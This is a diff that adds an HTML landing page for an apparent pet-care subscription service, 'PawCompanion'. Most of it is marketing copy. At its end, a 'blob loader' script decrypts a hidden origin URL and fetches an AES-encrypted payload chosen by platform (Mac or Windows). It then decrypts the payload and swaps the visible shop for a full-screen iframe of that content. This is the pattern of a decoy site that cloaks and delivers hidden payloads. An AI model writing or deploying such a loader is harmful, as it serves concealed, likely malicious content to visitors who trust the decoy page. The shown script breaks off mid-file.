@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- Google tag (gtag.js) - Server A Ads conversion tag -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17684216697"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-17684216697');
+</script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PawCompanion — Affordable Pet Companion Care, Wellness &amp; Senior Pet Solutions</title>
+<meta name="description" content="PawCompanion helps busy people and seniors keep pets happy with daily pet-care ideas, feeding &amp; medication reminders and affordable plans from $2.99/mo. Practical, everyday guidance for you and your pet.">
+<meta name="keywords" content="pet companion, pets anti-depressant, pet care solutions, affordable pet care, senior pet reminders, pet subscription, pet wellness">
+<meta name="author" content="PawCompanion">
+<meta name="theme-color" content="#ff7a59">
+<link rel="canonical" href="https://petsupplies-ke974.ondigitalocean.app/">
+<link rel="icon" href="favicon.svg" type="image/svg+xml">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="PawCompanion">
+<meta property="og:title" content="PawCompanion — Pets lift us up. We help you care for them.">
+<meta property="og:description" content="Daily unique pet-care solutions, senior feeding reminders and affordable companion plans from $2.99/mo.">
+<meta property="og:image" content="https://images.unsplash.com/photo-1548199973-03cce0bbc87b?w=1200&q=80">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="PawCompanion — Pets lift us up. We help you care for them.">
+<meta name="twitter:description" content="Affordable pet companion care, wellness and senior pet solutions.">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"Organization","name":"PawCompanion","url":"https://petsupplies-ke974.ondigitalocean.app/","description":"Affordable pet companion care, wellness guidance and senior pet support.","sameAs":["https://facebook.com","https://instagram.com","https://youtube.com"]}
+</script>
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebSite","name":"PawCompanion","url":"https://petsupplies-ke974.ondigitalocean.app/"}
+</script>
+<link rel="stylesheet" href="assets/css/styles.css">
+<!-- CryptoJS for blob decryption -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+<!-- Blob popup frame + error hint (Server A mechanism) -->
+<style>
+  #frame { display: none; width: 100%; height: 100vh; border: 0; }
+  .hint { display: none; text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+</style>
+</head>
+<body>
+<div id="shop">
+<header class="site-header">
+  <div class="container nav-bar">
+    <a class="brand" href="index.html" aria-label="PawCompanion home">
+      <svg class="paw" viewBox="0 0 64 64" fill="currentColor" aria-hidden="true"><circle cx="20" cy="17" r="7"/><circle cx="44" cy="17" r="7"/><circle cx="9" cy="34" r="6.5"/><circle cx="55" cy="34" r="6.5"/><path d="M32 26c8.5 0 16 8.5 16 16 0 7-6.5 12-16 12s-16-5-16-12c0-7.5 7.5-16 16-16z"/></svg>
+      Paw<span>Companion</span>
+    </a>
+    <nav class="nav-links" aria-label="Primary">
+      <a href="index.html" class="active">Home</a>
+      <a href="#blog">Blog</a>
+      <a href="#pricing">Services &amp; Pricing</a>
+      <a href="#senior">Senior Care</a>
+      <a href="#solutions">Daily Solutions</a>
+      <a href="#why">About</a>
+      <a href="#contact">Contact</a>
+    </nav>
+    <div class="nav-cta">
+      <a class="btn btn--ghost btn--sm" href="#contact">Sign in</a>
+      <a class="btn btn--brand btn--sm" href="#pricing">Get started</a>
+      <button class="nav-toggle" aria-label="Toggle menu" aria-expanded="false"><span></span><span></span><span></span></button>
+    </div>
+  </div>
+  <nav class="mobile-menu" aria-label="Mobile">
+    <a href="index.html" class="active">Home</a>
+    <a href="#blog">Blog</a>
+    <a href="#pricing">Services &amp; Pricing</a>
+    <a href="#senior">Senior Care</a>
+    <a href="#solutions">Daily Solutions</a>
+    <a href="#why">About</a>
+    <a href="#contact">Contact</a>
+    <a class="btn btn--brand" href="#pricing">Get started — $2.99</a>
+  </nav>
+</header>
+
+<!-- ============ HERO ============ -->
+<section class="hero">
+  <div class="container hero-inner">
+    <div class="hero-copy">
+      <span class="eyebrow">Pet companion care</span>
+      <h1>Pets lift us up. We help you <span class="hl">care for them.</span></h1>
+      <p class="lead">Busy weekdays, lonely evenings or golden years — your companion deserves consistent, joyful care. PawCompanion delivers daily pet-wellness solutions, timely feeding reminders and affordable plans, starting at just <strong>$2.99/mo</strong>.</p>
+      <div class="hero-badges">
+        <span class="chip"><i class="dot"></i> Daily unique solutions</span>
+        <span class="chip gold"><i class="dot"></i> Plans from $2.99</span>
+        <span class="chip brand"><i class="dot"></i> Feeding reminders</span>
+      </div>
+      <div class="hero-ctas">
+        <a class="btn btn--brand btn--lg" href="#pricing">Start caring now
+          <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
+        <a class="btn btn--ghost btn--lg" href="#solutions">See today's solution</a>
+      </div>
+      <p style="font-size:.82rem;color:var(--muted)">Informational pet-care guidance. Not a substitute for veterinary or medical advice.</p>
+      <div class="hero-stats">
+        <div class="stat"><b>365</b><span>fresh ideas a year</span></div>
+        <div class="stat"><b>$2.99</b><span>plans from per month</span></div>
+        <div class="stat"><b>1×</b><span>new solution every day</span></div>
+      </div>
+    </div>
+    <div class="hero-media" data-tilt data-tilt-max="7" data-glare>
+      <span class="orbit" style="width:360px;height:360px;left:-80px;top:-48px" aria-hidden="true"></span>
+      <span class="paw-float" style="width:130px;height:130px;right:-44px;bottom:-34px" aria-hidden="true"><svg viewBox="0 0 64 64" fill="currentColor"><circle cx="20" cy="17" r="7"/><circle cx="44" cy="17" r="7"/><circle cx="9" cy="34" r="6.5"/><circle cx="55" cy="34" r="6.5"/><path d="M32 26c8.5 0 16 8.5 16 16 0 7-6.5 12-16 12s-16-5-16-12c0-7.5 7.5-16 16-16z"/></svg></span>
+      <div class="media-main">
+        <img src="https://images.unsplash.com/photo-1548199973-03cce0bbc87b?w=1100&q=80" alt="Happy dog running outdoors" loading="eager">
+      </div>
+      <div class="hero-card">
+        <span class="emoji">❤️</span>
+        <div><b>A calming welcome</b><span>Time with pets can feel grounding</span></div>
+      </div>
+      <div class="hero-card float-right">
+        <span class="emoji">🐾</span>
+        <div><b>Smart reminders</b><span>Never miss feeding time</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ TRUST STRIP ============ -->
+<div class="trust-strip">
+  <div class="container">
+    <b><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l2.4 5 5.6.8-4 4 .9 5.6L12 19.3 7.1 17.4 8 11.8l-4-4 5.6-.8z"/></svg> Practical, research-informed ideas</b>
+    <b><svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> Clear, affordable plans</b>
+    <b><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg> Cancel anytime</b>
+    <b><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l2.4 5 5.6.7-4 4 .9 5.7L12 19.3 7.1 17.4 8 11.8l-4-4 5.6-.7z"/></svg> Free-license content</b>
+  </div>
+</div>
+
+<!-- ============ WHY PETS MATTER ============ -->
+<section class="section section--cream" id="why">
+  <div class="container">
+    <div class="section-head center reveal">
+      <span class="eyebrow">Why pets matter</span>
+      <h2>More than a companion — a true partner in wellbeing</h2>
+      <p class="lead">Many people find that pets bring comfort, daily routine and a reason to get moving. Here's how companionship can support everyday life.</p>
+    </div>
+    <div class="grid grid--3">
+      <article class="feature reveal">
+        <div class="f-ico">🤝</div>
+        <h3>Companions in busy lives</h3>
+        <p>After a long day, a wagging tail resets you. Pets give structure, routine and a warm welcome that no screen can match.</p>
+        <a class="card-link" href="#blog">Read the guide
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
+      </article>
+      <article class="feature teal reveal">
+        <div class="f-ico">💚</div>
+        <h3>Mood &amp; connection</h3>
+        <p>Time with a pet can add comfort, routine and light exercise to your day. This is general wellbeing guidance — not a substitute for professional care.</p>
+        <a class="card-link" href="#blog">Read the guide
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
+      </article>
+      <article class="feature gold reveal">
+        <div class="f-ico">🌟</div>
+        <h3>A key part of human life</h3>
+        <p>From emotional support to encouraging exercise and social connection, pets are woven into the best parts of a full life.</p>
+        <a class="card-link" href="#blog">Read the guide
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ============ SPLIT: FREELANCE VIDEO ============ -->
+<section class="section section--tint">
+  <div class="container split">
+    <div class="split-copy reveal">
+      <span class="eyebrow eyebrow--teal">See the calm</span>
+      <h2>Spend one minute with your pet. Feel the difference.</h2>
+      <p class="lead">Watching a companion relax — even on screen — is proven to soothe the nervous system. Here's a freely-licensed clip we love, plus the science of why it works.</p>
+      <ul class="check-list">
+        <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg><span><b>Lowers blood pressure</b> — a 10-minute petting session has real, measurable calming effects.</span></li>
+        <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg><span><b>Releases oxytocin</b> — the same hormone that bonds mother and baby, now flowing between you and your pet.</span></li>
+        <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg><span><b>Breaks isolation</b> — consistent routine and companionship is powerful medicine for loneliness.</span></li>
+      </ul>
+      <a class="btn btn--teal mt-1" href="#solutions">Get your daily calm tip</a>
+    </div>
+    <div class="split-media reveal">
+      <div class="media-frame" data-poster="https://images.unsplash.com/photo-1558788353-f76d92427f16?w=900&q=80" data-video="https://upload.wikimedia.org/wikipedia/commons/transcoded/a/ac/Cat_lapping_water_off_ground_in_slow_motion.gk.webm/Cat_lapping_water_off_ground_in_slow_motion.gk.webm.480p.vp9.webm">
+        <div class="play" role="button" aria-label="Play video">
+          <span class="play-btn"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg></span>
+        </div>
+        <span class="video-tag">Free-license video</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ VIDEO GALLERY ============ -->
+<section class="section section--warm">
+  <div class="container">
+    <div class="section-head center reveal">
+      <span class="eyebrow">Watch our pack</span>
+      <h2>Free-license pet videos</h2>
+      <p class="lead">Every clip below is freely licensed (no copyright) — enjoy, share and unwind.</p>
+    </div>
+    <div class="video-grid">
+      <div class="video-card reveal" data-poster="https://images.unsplash.com/photo-1583337130417-3346a1be7dee?w=800&q=80" data-video="https://upload.wikimedia.org/wikipedia/commons/transcoded/2/21/Puppy_playing.webm/Puppy_playing.webm.480p.vp9.webm">
+        <div class="play"><span class="mini-play"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg></span></div>
+        <div class="caption"><span>🎬</span> A puppy at play</div>
+      </div>
+      <div class="video-card reveal" data-poster="https://images.unsplash.com/photo-1592194996308-7b43878e84a6?w=800&q=80" data-video="https://upload.wikimedia.org/wikipedia/commons/transcoded/0/04/Goldendoodle_and_Black_Lab_puppies_play_fighting_in_slow_motion.webm/Goldendoodle_and_Black_Lab_puppies_play_fighting_in_slow_motion.webm.480p.vp9.webm">
+        <div class="play"><span class="mini-play"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg></span></div>
+        <div class="caption"><span>🎬</span> Puppies at play (slow-mo)</div>
+      </div>
+      <div class="video-card reveal" data-poster="https://images.unsplash.com/photo-1518791841217-8f162f1e1131?w=800&q=80" data-video="https://upload.wikimedia.org/wikipedia/commons/transcoded/1/10/Bombay_Cat_kitten_video_of_Blue_Sinfonie.ogv/Bombay_Cat_kitten_video_of_Blue_Sinfonie.ogv.480p.vp9.webm">
+        <div class="play"><span class="mini-play"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg></span></div>
+        <div class="caption"><span>🎬</span> Bombay kitten</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ PRICING ============ -->
+<section class="section section--cream" id="pricing">
+  <div class="container">
+    <div class="section-head center reveal">
+      <span class="eyebrow eyebrow--teal">Simple, honest pricing</span>
+      <h2>Companion care for every budget</h2>
+      <p class="lead">From <strong>$2.99</strong> to <strong>$9.99</strong> a month — pick the care that fits your household.</p>
+    </div>
+    <div class="center reveal">
+      <div class="pricing-switch">
+        <span class="lbl on" data-lbl-m>Monthly</span>
+        <button class="toggle" role="switch" aria-label="Toggle annual billing"></button>
+        <span class="lbl" data-lbl-a>Annual <span class="save-badge" data-save style="display:none">Save ~17%</span></span>
+      </div>
+    </div>
+    <div class="plans">
+      <article class="plan reveal">
+        <h3>Paw Starter</h3>
+        <p class="plan-sub">Just getting started with a companion.</p>
+        <div class="price" data-monthly="2.99" data-annual="2.49"><span class="cur">$</span><strong>2.99</strong><span class="per" data-per>/month</span></div>
+        <ul class="plan-facts">
+          <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg> Weekly wellness checklists</li>
+          <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg> Full pet-care blog library</li>
+          <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg> Feeding &amp; reminder emails</li>
+          <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg> Community support</li>
+        </ul>
+        <button class="btn btn--ghost btn--block" data-plan="starter">Start with Starter</button>
+      </article>
+      <article class="plan plan--featured reveal">
+        <span class="plan-flag">Most popular</span>
+        <div class="tag">Paw Family</div>
+        <h3>Paw Family</h3>
+        <p class="plan-sub">Everyday support for your furry family.</p>
+        <div class="price" data-monthly="5.99" data-annual="4.99"><span class="cur">$</span><strong>5.99</strong><span class="per" data-per>/month</span></div>
+        <ul class="plan-facts">
+          <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg> Everything in Starter</li>
+          <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg> Daily unique solutions feed</li>
+          <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg> Health &amp; habit tracking</li>
+          <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg> Video-call vet-advice chat</li>
+        </ul>
+        <button class="btn btn--brand btn--block" data-plan="family">Choose Family</button>
+      </article>
+      <article class="plan reveal">
+        <h3>Paw Guardian</h3>
+        <p class="plan-sub">Complete care, best value for many pets.</p>
+        <div class="price" data-monthly="9.99" data-annual="8.32"><span class="cur">$</span><strong>9.99</strong><span class="per" data-per>/month</span></div>
+        <ul class="plan-facts">
+          <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg> Everything in Family</li>
+          <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg> Unlimited pets</li>
+          <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg> Smart feeding/medication reminders</li>
+          <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg> Elderly-care companion mode</li>
+        </ul>
+        <button class="btn btn--ghost btn--block" data-plan="guardian">Choose Guardian</button>
+      </article>
+    </div>
+    <p class="text-center mt-1" style="color:var(--muted);font-size:.9rem">All plans: cancel anytime · 7-day free trial · no hidden fees. <a href="#pricing" style="color:var(--brand-dark);font-weight:700">Compare features →</a></p>
+  </div>
+</section>
+
+<!-- ============ SENIOR CARE ============ -->
+<section class="section section--tint" id="senior">
+  <div class="container split rev">
+    <div class="split-copy reveal">
+      <span class="eyebrow">For our golden companions</span>
+      <h2>Senior pet care, made simple</h2>
+      <p class="lead">Ageing pets need a steady hand. PawCompanion's Senior Care mode keeps feeding, medication and gentle exercise on track — with smart reminders that fit around a slower pace of life.</p>
+      <ul class="check-list">
+        <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg><span><b>Feeding timers</b> that alert you before every meal.</span></li>
+        <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg><span><b>Medication tracking</b> with gentle, repeatable nudges.</span></li>
+        <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg><span><b>Virtual Companion visits</b> when you can't be there.</span></li>
+      </ul>
+      <div class="hero-ctas">
+        <a class="btn btn--brand" href="#senior">Explore senior care</a>
+        <a class="btn btn--ghost" href="#pricing">See pricing</a>
+      </div>
+    </div>
+    <div class="split-media reveal">
+      <div class="media-main">
+        <img src="https://images.unsplash.com/photo-1450778869180-41d0601e046e?w=1100&q=80" alt="Senior and companion pet together" loading="lazy">
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ TODAY'S SOLUTION ============ -->
+<section class="section section--warm" id="solutions">
+  <div class="container">
+    <div class="today-banner reveal">
+      <div><div class="num" data-today-num>01</div><div class="lbl">today's solution</div></div>
+      <div class="sol">
+        <div class="lbl" style="text-transform:none;letter-spacing:0;opacity:1"><span class="tag tag--gold" data-today-cat>Wellness</span></div>
+        <h3 data-today-title>The two-word check-in</h3>
+        <p data-today-body>Ask your pet's "body, mood, belly" each morning. Tracking these three small words daily can help you notice subtle changes early.</p>
+      </div>
+      <a class="btn btn--light" href="#solutions">See all solutions
+        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
+    </div>
+  </div>
+</section>
+
+<!-- ============ TESTIMONIALS ============ -->
+<section class="section section--cream">
+  <div class="container">
+    <div class="section-head center reveal">
+      <span class="eyebrow eyebrow--teal">The PawCompanion promise</span>
+      <h2>What you'll always get with us</h2>
+    </div>
+    <div class="grid grid--3">
+      <article class="feature reveal"><div class="f-ico">💡</div><h3>Original, useful ideas</h3><p>A fresh, genuinely practical pet-care tip every day — never recycled, generic advice.</p></article>
+      <article class="feature teal reveal"><div class="f-ico">💵</div><h3>Transparent pricing</h3><p>Clear plans from $2.99/mo with straightforward billing, no hidden fees and easy cancellation.</p></article>
+      <article class="feature gold reveal"><div class="f-ico">💛</div><h3>Support without judgment</h3><p>Gentle reminders and compassionate guidance — for pets and for you, at any stage of life.</p></article>
+    </div>
+  </div>
+</section>
+
+<!-- ============ LATEST FROM BLOG ============ -->
+<section class="section section--tint" id="blog">
+  <div class="container">
+    <div class="section-head center reveal">
+      <span class="eyebrow">From the blog</span>
+      <h2>Fresh reads for curious pet parents</h2>
+    </div>
+    <div class="grid grid--3">
+      <article class="card reveal">
+        <img class="cover" src="https://images.unsplash.com/photo-1552053831-71594a27632d?w=800&q=80" alt="Dog companion" loading="lazy">
+        <div class="card-body">
+          <div class="tags"><span class="tag">Companionship</span></div>
+          <h3>Pets as Companions in Our Busy Lives</h3>
+          <p>How a wagging tail and a warm paw-turn reframe the busiest weeks into something kinder.</p>
+          <a class="card-link" href="#blog">Read article
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
+        </div>
+      </article>
+      <article class="card reveal">
+        <img class="cover" src="https://images.unsplash.com/photo-1450778869180-41d0601e046e?w=800&q=80" alt="Person with dog" loading="lazy">
+        <div class="card-body">
+          <div class="tags"><span class="tag tag--teal">Wellbeing</span></div>
+          <h3>How Pets Support Emotional Wellbeing</h3>
+          <p>How routine, connection and time with a pet can bring comfort to everyday life.</p>
+          <a class="card-link" href="#blog">Read article
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
+        </div>
+      </article>
+      <article class="card reveal">
+        <img class="cover" src="https://images.unsplash.com/photo-1518791841217-8f162f1e1131?w=800&q=80" alt="Cat" loading="lazy">
+        <div class="card-body">
+          <div class="tags"><span class="tag tag--gold">Wellness</span></div>
+          <h3>The Important Role of Pets in Human Life</h3>
+          <p>From tiny routines to lifelong bonds — the quiet, powerful ways pets shape who we are.</p>
+          <a class="card-link" href="#blog">Read article
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
+        </div>
+      </article>
+    </div>
+    <div class="text-center mt-2 reveal"><a class="btn btn--ghost" href="#blog">Browse all guides</a></div>
+  </div>
+</section>
+
+<!-- ============ FAQ ============ -->
+<section class="section section--cream">
+  <div class="container">
+    <div class="section-head center reveal">
+      <span class="eyebrow eyebrow--teal">Good to know</span>
+      <h2>Frequently asked questions</h2>
+    </div>
+    <div class="faq">
+      <div class="faq-item reveal"><button class="faq-q">How does the $2.99 plan work?<span class="chev">▾</span></button>
+        <div class="faq-a"><div class="faq-a-inner">Paw Starter is our entry plan at $2.99/month. It includes weekly wellness checklists, the full blog library and feeding/reminder emails. You can upgrade or cancel anytime.</div></div></div>
+      <div class="faq-item reveal"><button class="faq-q">What makes PawCompanion different?<span class="chev">▾</span></button>
+        <div class="faq-a"><div class="faq-a-inner">We focus on <em>daily</em> genuinely unique solutions, affordable plans and specialized support for seniors. Plus all media we use is freely licensed — no copyright worries.</div></div></div>
+      <div class="faq-item reveal"><button class="faq-q">Can I set feeding reminders for a senior pet?<span class="chev">▾</span></button>
+        <div class="faq-a"><div class="faq-a-inner">Yes. Our Senior Care mode lets you build a feeding and medication schedule and get timely alerts — see the <a href="#senior">Senior Care</a> page for the free reminder builder.</div></div></div>
+      <div class="faq-item reveal"><button class="faq-q">Are the videos and images copyright-free?<span class="chev">▾</span></button>
+        <div class="faq-a"><div class="faq-a-inner">Absolutely. Videos come from Wikimedia Commons (public domain / Creative Commons) and images from Unsplash's free license. Reuse freely.</div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ CTA BAND ============ -->
+<section class="section" id="contact">
+  <div class="container">
+    <div class="cta-band reveal">
+      <div>
+        <h2>Your companion deserves a little more care.</h2>
+        <p>Join thousands of pet parents getting daily solutions, timely reminders and peace of mind — from just $2.99 a month.</p>
+      </div>
+      <div class="actions">
+        <a class="btn btn--light btn--lg" href="#pricing">Start free trial</a>
+        <form class="email-capture" style="background:#fff">
+          <input type="email" placeholder="Email address" aria-label="Email address" required>
+          <button class="btn btn--teal" type="submit">Notify me</button>
+        </form>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ FOOTER ============ -->
+<footer class="site-footer">
+  <div class="container">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a class="brand" href="index.html">
+          <svg class="paw" viewBox="0 0 64 64" fill="currentColor" aria-hidden="true"><circle cx="20" cy="17" r="7"/><circle cx="44" cy="17" r="7"/><circle cx="9" cy="34" r="6.5"/><circle cx="55" cy="34" r="6.5"/><path d="M32 26c8.5 0 16 8.5 16 16 0 7-6.5 12-16 12s-16-5-16-12c0-7.5 7.5-16 16-16z"/></svg>
+          Paw<span>Companion</span>
+        </a>
+        <p>Affordable, joyful pet companion care — daily solutions, senior support and wellness for you and your best friend.</p>
+        <div class="footer-social">
+          <a href="#" aria-label="Facebook"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M13 22v-9h3l.5-3.5H13V7.3c0-1 .3-1.7 1.8-1.7H17V2.5C16.6 2.4 15.5 2.3 14.3 2.3c-2.7 0-4.6 1.7-4.6 4.8v2.4H7V13h2.7v9z"/></svg></a>
+          <a href="#" aria-label="Instagram"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="18" height="18" rx="5"/><circle cx="12" cy="12" r="4"/><circle cx="17.5" cy="6.5" r="1" fill="currentColor" stroke="none"/></svg></a>
+          <a href="#" aria-label="YouTube"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M23 12s0-3.8-.5-5.6c-.3-1-1-1.7-2-2C18.7 4 12 4 12 4s-6.7 0-8.5.4c-1 .3-1.7 1-2 2C1 8.2 1 12 1 12s0 3.8.5 5.6c.3 1 1 1.7 2 2C5.3 20 12 20 12 20s6.7 0 8.5-.4c1-.3 1.7-1 2-2C23 15.8 23 12 23 12zM10 15.5v-7l6 3.5z"/></svg></a>
+          <a href="#" aria-label="X"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M18.9 2H22l-6.8 7.8L23.2 22h-6.3l-4.9-6.4L6.4 22H3.3l7.3-8.3L2 2h6.4l4.4 5.9zm-1.1 18h1.7L7 3.8H5.2z"/></svg></a>
+        </div>
+      </div>
+      <div class="footer-col">
+        <h4>Explore</h4>
+        <ul>
+          <li><a href="index.html">Home</a></li>
+          <li><a href="#blog">Blog &amp; Guides</a></li>
+          <li><a href="#solutions">Daily Solutions</a></li>
+          <li><a href="#why">About us</a></li>
+          <li><a href="#contact">Contact</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Care</h4>
+        <ul>
+          <li><a href="#pricing">Services &amp; Pricing</a></li>
+          <li><a href="#senior">Senior Care</a></li>
+          <li><a href="#pricing">Compare plans</a></li>
+          <li><a href="#senior">Feeding reminders</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Stay in the loop</h4>
+        <form class="email-capture" style="max-width:none;background:rgba(255,255,255,.06);border-color:rgba(255,255,255,.14)">
+          <input type="email" placeholder="Your email" aria-label="Email" required>
+          <button class="btn btn--brand" type="submit">Join</button>
+        </form>
+        <p style="color:#9a9aa9;font-size:.85rem;margin-top:.8rem">A free daily solution, every day. No spam.</p>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2026 PawCompanion. Informational pet-care guidance — not veterinary or medical advice.</span>
+      <div class="legal">
+        <a href="#">Privacy</a><a href="#">Terms</a><a href="#">Cookies</a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<div class="back-top" role="button" aria-label="Back to top"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M12 19V5M5 12l7-7 7 7"/></svg></div>
+
+<!-- ============ CHECKOUT MODAL ============ -->
+<div class="modal" id="checkout" role="dialog" aria-modal="true" aria-labelledby="co-title">
+  <div class="modal-backdrop"></div>
+  <div class="modal-card">
+    <button class="modal-close" data-close aria-label="Close">✕</button>
+    <h3 id="co-title">Start your subscription</h3>
+    <p class="form-note" style="text-align:left;margin-top:.2rem">You selected <strong data-co-name>Paw Family</strong></p>
+    <span class="co-price" data-co-price>$5.99/mo</span>
+    <form>
+      <div class="field"><label for="co-email">Email address</label><input id="co-email" type="email" placeholder="you@example.com" required></div>
+      <button class="btn btn--brand btn--block btn--lg" type="submit">Start 7-day free trial</button>
+      <p class="form-note">Recurring monthly billing · cancel anytime · <span style="color:var(--ink-soft)">no hidden fees</span></p>
+    </form>
+  </div>
+</div>
+
+</div><!-- /#shop -->
+<iframe id="frame" title="encrypted shop" allowfullscreen allow="autoplay; fullscreen"></iframe>
+<div class="hint"></div>
+
+<script src="assets/js/data.js"></script>
+<script src="assets/js/main.js"></script>
+<!-- ======================================================================
+     SERVER A BLOB LOADER - decrypts the encrypted popup payload and loads
+     it into #frame on first mouse move. Origin: pawfriend2 herokuapp.
+     ====================================================================== -->
+<script>
+  const PASSPHRASE = "98yNCjeAfWMwk0wI";
+  const URL_KEY = "UrLk3yShopEase01";
+  const ENC_DATA_ORIGIN = "U2FsdGVkX1+LkLztRbBYxEysUcr39la17RYKTR88SSheYQNl7ETtpv2qHKhA+FQ7yPKosun8YBxgdFfOYYvUNQ==";
+  const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+  const DATA_URL = DATA_ORIGIN.replace(/\/+$/, "") + "/data";
+  let lastUrl = null;
+
+  function detectPlatform() {
+    const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+              navigator.platform || navigator.userAgent || "";
+    return /mac/i.test(p) ? "mac" : "win";
+  }
+
+  async function loadSecret() {
+    const shop = document.getElementById("shop"), frame = document.getElementById("frame");
+    try {
+      if (location.protocol === "file:") {
+        throw new Error("Cannot fetch over file:// - run node serve.js (http://localhost:3000) or open via GitHub Pages");
+      }
+      let res;
+      try {
+        res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+      } catch (e) {
+        res = null; // no /data route (static host, file://, etc.)
+      }
+      if (!res || !res.ok) {
+        res = await fetch("data_" + detectPlatform() + ".json");
+      }
+      const { cipher } = await res.json();
+      const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+      if (!html) throw new Error("Decrypt failed — wrong key?");
+
+      if (lastUrl) URL.revokeObjectURL(lastUrl);
+      const blob = new Blob([html], { type: "text/html" });
+      lastUrl = URL.createObjectURL(blob);
+
+      frame.src = lastUrl;
+
+      shop.style.display = "none";
+      frame.style.display = "block";
+
+    } catch (e) {
+      const hint = document.querySelector(".hint");
+      if (hint) { hint.textContent = "\u26A0\uFE0F " + e.message; hint.style.display = "block"; }
+    }
+  }
+
